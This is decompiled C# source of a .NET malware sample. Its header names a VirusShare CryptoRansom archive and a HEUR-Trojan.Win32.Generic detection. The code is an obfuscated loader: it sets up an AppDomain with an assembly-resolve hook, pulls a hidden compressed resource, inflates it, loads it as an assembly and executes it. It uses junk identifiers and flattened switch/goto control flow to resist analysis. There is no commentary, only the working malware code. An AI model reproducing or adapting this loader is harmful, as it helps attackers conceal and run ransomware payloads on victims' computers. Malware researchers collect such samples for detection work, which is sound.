// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: SyncuiLoaeer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 059388F9-BBF4-421E-BCD6-B0AFD3B01313
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-de076ffaf8b1839acfa793e00ba736a3d16439d6e74208b409c66d71c07a7e79.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Policy;

internal sealed class \u003CModule\u003E
{
  []
  public static int hAVitUzGGE6gbqsz21Dt2Q(string[] _param0)
  {
    Ⴃ.Ⴈ.Ⴄ();
    AppDomain appDomain = Ⴃ.Ⴈ.Ⴗ(574, 617);
    Ⴃ.Ⴄ(appDomain, new ResolveEventHandler(\u003CModule\u003E.bRcx4efW90K9fm4qgk\u002FSxw\u003D\u003D), 713, 754);
    return appDomain.ExecuteAssemblyByName(new AssemblyName(Class1.main(Class1.Ⴄ(1184220530, 0))), (Evidence) null, _param0);
  }

  public static Assembly bRcx4efW90K9fm4qgk\u002FSxw\u003D\u003D(
    object _param0,
    ResolveEventArgs A_1)
  {
    return \u003CModule\u003E.\u002B0814zG5kEmN0KIUMuwyt(Convert.ToBase64String(Ⴃ.Ⴈ.Ⴈ(534, 570).GetBytes(Ⴃ.Ⴈ.Ⴅ.Ⴗ(A_1, 507, 478).ToLowerInvariant())));
  }

  public static Assembly \u002B0814zG5kEmN0KIUMuwyt(string _param0)
  {
    Stream stream = Ⴃ.Ⴈ.Ⴅ.Ⴓ(Ⴃ.Ⴈ.Ⴀ(905, 1010), _param0, 842, 880);
    Assembly assembly;
    try
    {
      Stream input1 = stream;
      if (input1 == null)
      {
        assembly = (Assembly) null;
      }
      else
      {
        int num1 = Class1.Ⴓ(new BinaryReader(input1), 459, 403);
        DeflateStream input2 = new DeflateStream(stream, CompressionMode.Decompress);
        try
        {
          switch (4)
          {
            case 0:
            case 3:
              break;
            default:
              assembly = Ⴃ.Ⴍ(Class1.Ⴐ.Ⴃ(new BinaryReader((Stream) input2), num1, 288, 378), 16, 37);
              break;
          }
        }
        finally
        {
          int num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 0:
                goto label_10;
              case 1:
              case 4:
                goto label_9;
              default:
                num2 = input2 == null ? 0 : 1;
                continue;
            }
          }
label_9:
          input2.Dispose();
label_10:;
        }
      }
    }
    finally
    {
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_15;
          case 1:
          case 2:
          case 3:
          case 4:
            goto label_14;
          default:
            num = stream == null ? 0 : 2;
            continue;
        }
      }
label_14:
      stream.Dispose();
label_15:;
    }
    return assembly;
  }

  static \u003CModule\u003E() => Ⴃ.Ⴈ.Ⴄ();
}
